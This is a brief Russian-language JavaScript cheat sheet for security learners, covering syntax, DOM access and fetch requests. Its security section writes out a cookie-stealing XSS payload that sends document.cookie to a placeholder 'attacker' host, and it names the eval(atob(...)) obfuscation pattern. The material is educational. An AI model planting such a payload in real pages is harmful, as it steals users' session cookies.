# JavaScript — базовый уровень (для безопасности)

Зачем безопаснику JS: понимать клиентскую логику, XSS-payload'ы, читать код фронтенда, Burp/DevTools, SSRF/DOM-атаки.

## Синтаксис основы
```javascript
let x = 5; const PI = 3.14; var old = 1;   // let/const (совр.), var (устар.)
let s = "text"; let n = 42; let b = true; let arr = [1,2,3]; let obj = {a:1};
// функции
function add(a, b) { return a + b; }
const mul = (a, b) => a * b;               // стрелочная
// условия/циклы
if (x > 0) {...} else {...}
for (let i=0; i<10; i++) {...}
arr.forEach(v => console.log(v));
```

## Работа с DOM (браузер)
```javascript
document.getElementById("id")              // элемент по id
document.querySelector(".class")           // CSS-селектор
document.cookie                            // куки (цель XSS)
localStorage.getItem("token")              // хранилище
element.innerHTML = "<b>x</b>"             // вставка HTML (опасно → XSS)
```

## Запросы (fetch / AJAX)
```javascript
fetch("http://api/data")
  .then(r => r.json())
  .then(d => console.log(d));
fetch("/login", {method:"POST", body:JSON.stringify({u:"a"}),
  headers:{"Content-Type":"application/json"}});
```

## Для безопасности
- **XSS-payload:** `<script>fetch('http://attacker/?c='+document.cookie)</script>` — крадёт куки.
- **DevTools (F12):** Console (выполнить JS), Network (запросы/API), Sources (код), Application (cookie/storage).
- **Обфускация:** `eval(atob("base64"))` — декод+выполнение (встречается в malware/payload).
- **JSON** — формат обмена с API (`JSON.parse` / `JSON.stringify`).
- **Node.js** — JS на сервере; риски: command injection через `child_process`, prototype pollution.

## Что понимать, не углубляясь
- JS выполняется в браузере жертвы → основа XSS.
- Клиентские проверки (валидация формы) НЕ защита — обходятся в DevTools/Burp.
- Читать минифицированный код — Beautify в DevTools.
